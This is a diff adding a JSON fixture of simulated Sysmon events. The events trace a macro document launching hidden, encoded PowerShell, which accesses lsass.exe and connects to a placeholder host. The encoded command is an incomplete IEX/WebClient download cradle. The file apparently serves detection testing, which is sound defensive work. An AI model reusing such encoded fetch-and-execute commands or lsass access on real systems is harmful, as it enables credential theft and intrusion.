@@ -1,0 +1,49 @@
+{
+  "datasetId": "officeToPowerShell",
+  "events": [
+    {
+      "timestamp": "2026-04-20T13:41:12Z",
+      "Computer": "FIN-WS-044",
+      "User": "FINANCE\\j.santos",
+      "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "ParentImage": "C:\\Windows\\explorer.exe",
+      "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" C:\\Users\\j.santos\\Downloads\\quarterly_review.docm",
+      "EventID": 1,
+      "ProviderName": "Microsoft-Windows-Sysmon"
+    },
+    {
+      "timestamp": "2026-04-20T13:41:19Z",
+      "Computer": "FIN-WS-044",
+      "User": "FINANCE\\j.santos",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==",
+      "EventID": 1,
+      "ProviderName": "Microsoft-Windows-Sysmon"
+    },
+    {
+      "timestamp": "2026-04-20T13:41:26Z",
+      "Computer": "FIN-WS-044",
+      "User": "FINANCE\\j.santos",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+      "GrantedAccess": "0x1010",
+      "EventID": 10,
+      "ProviderName": "Microsoft-Windows-Sysmon"
+    },
+    {
+      "timestamp": "2026-04-20T13:41:34Z",
+      "Computer": "FIN-WS-044",
+      "User": "FINANCE\\j.santos",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "DestinationIp": "45.77.89.12",
+      "DestinationHostname": "sync-cloud-notify.example",
+      "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==",
+      "EventID": 3,
+      "ProviderName": "Microsoft-Windows-Sysmon"
+    }
+  ]
+}
+
